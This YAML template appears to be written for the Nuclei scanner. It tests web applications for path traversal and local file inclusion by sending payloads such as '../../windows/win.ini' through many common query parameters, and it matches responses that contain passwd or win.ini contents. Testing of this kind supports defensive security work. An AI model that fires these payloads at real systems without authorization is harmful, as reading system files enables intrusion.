http:
- attack: clusterbomb
  matchers:
  - type: word
    words:
    - root:x:0:0
    - /bin/bash
    - /bin/false
  - type: word
    words:
    - '[fonts]'
    - '[extensions]'
  - regex:
    - 'root:.*:0:0:'
    type: regex
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}/?{{param}}={{payload}}'
  - '{{BaseURL}}/index.php?{{param}}={{payload}}'
  - '{{BaseURL}}/index.html?{{param}}={{payload}}'
  payloads:
    param:
    - cat
    - dir
    - action
    - board
    - date
    - detail
    - file
    - download
    - path
    - folder
    - prefix
    - include
    - page
    - inc
    - locate
    - show
    - doc
    - site
    - type
    - view
    - content
    - document
    - layout
    - mod
    - conf
    payload:
    - \WINDOWS\win.ini
    - ../../windows/win.ini
    - '....//....//windows/win.ini'
